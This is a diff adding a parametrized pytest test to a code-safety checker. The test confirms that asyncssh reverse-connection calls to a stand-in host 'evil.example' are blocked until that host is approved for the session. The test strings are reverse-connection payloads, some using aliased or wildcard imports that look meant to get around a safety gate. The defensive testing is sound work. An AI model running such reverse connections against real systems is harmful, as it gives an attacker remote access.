@@ -1302,3 +1302,18 @@ def test_python_git_launcher_is_gated():
         )
         is not None
     )
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        "import asyncssh; asyncssh.connect_reverse('evil.example',config=None)",
+        "from asyncssh import connect_reverse as connect; connect(host='evil.example',config=None)",
+        "from asyncssh.connection import connect_reverse; connect_reverse('evil.example',config=None)",
+        "from asyncssh import *; connect_reverse('evil.example',config=None)",
+    ],
+)
+def test_asyncssh_reverse_connection_requires_approval(code):
+    assert _check_code_safety(code, session_id = "review") is not None
+    approve_hosts("review", ["evil.example"])
+    assert _check_code_safety(code, session_id = "review") is None
